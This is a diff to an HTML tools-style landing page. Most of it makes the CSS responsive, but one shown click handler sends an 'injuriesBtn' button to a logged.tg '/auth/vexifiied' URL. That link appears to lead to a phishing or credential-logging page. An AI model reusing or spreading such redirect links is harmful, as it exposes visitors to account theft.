@@ -10,8 +10,8 @@
       padding: 0;
       background-color: #000;
       font-family: 'Arial', sans-serif;
-      overflow: hidden;
-      height: 100vh;
+      overflow-x: hidden;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
@@ -23,12 +23,16 @@
       top: 20px;
       left: 50%;
       transform: translateX(-50%);
-      font-size: 2rem;
+      font-size: clamp(1.5rem, 5vw, 2rem);
       font-weight: bold;
       color: #00a8ff;
       text-shadow: 0 0 10px #00a8ff, 0 0 20px #00a8ff;
       z-index: 100;
       animation: glow 2s infinite alternate;
+      text-align: center;
+      width: 100%;
+      padding: 0 20px;
+      box-sizing: border-box;
     }
     
     @keyframes glow {
@@ -39,10 +43,13 @@
     .button-container {
       display: flex;
       justify-content: center;
-      gap: 30px;
+      gap: 20px;
       z-index: 10;
-      margin-bottom: 50px;
+      margin: 30px 0;
       flex-wrap: wrap;
+      width: 100%;
+      padding: 0 20px;
+      box-sizing: border-box;
     }
     
     .tool-btn {
@@ -51,8 +58,8 @@
       color: #00a8ff;
       border: 2px solid #00a8ff;
       border-radius: 50px;
-      padding: 18px 40px;
-      font-size: 1.5rem;
+      padding: 15px 30px;
+      font-size: clamp(1rem, 4vw, 1.5rem);
       font-weight: bold;
       cursor: pointer;
       transition: all 0.3s ease;
@@ -60,6 +67,8 @@
       box-shadow: 0 0 15px rgba(0, 168, 255, 0.3);
       min-width: 200px;
       text-align: center;
+      flex: 1 1 auto;
+      max-width: 300px;
     }
     
     .tool-btn:hover {
@@ -76,13 +85,15 @@
       background: rgba(0, 20, 40, 0.5);
       border: 1px solid #00a8ff;
       border-radius: 15px;
-      padding: 25px;
+      padding: 20px;
+      width: calc(100% - 60px);
       max-width: 800px;
-      margin: 0 30px;
+      margin: 20px 30px;
       box-shadow: 0 0 20px rgba(0, 168, 255, 0.2);
       z-index: 10;
       color: #cceeff;
       line-height: 1.6;
+      font-size: clamp(0.9rem, 3vw, 1rem);
     }
     
     .info-panel h2 {
@@ -90,6 +101,12 @@
       text-align: center;
       margin-top: 0;
       text-shadow: 0 0 5px #00a8ff;
+      font-size: clamp(1.2rem, 4vw, 1.8rem);
+    }
+    
+    .info-panel h3 {
+      color: #00a8ff;
+      font-size: clamp(1rem, 3vw, 1.3rem);
     }
     
     #snowCanvas {
@@ -123,6 +140,24 @@
       width: 400px;
       height: 400px;
       background: rgba(0, 100, 255, 0.02);
+    }
+
+    @media (max-width: 768px) {
+      .button-container {
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      .tool-btn {
+        width: 80%;
+        max-width: none;
+      }
+      
+      .info-panel {
+        margin: 20px 15px;
+        width: calc(100% - 30px);
+        padding: 15px;
+      }
     }
   </style>
 </head>
@@ -222,8 +257,6 @@ document.getElementById('splunkBtn').addEventListener('click', () => {
 document.getElementById('injuriesBtn').addEventListener('click', () => {
   window.location.href = 'https://www.logged.tg/auth/vexifiied';
 });
-
-// Replace the example.com URLs with your actual redirect links
 </script>
 </body>
 </html>
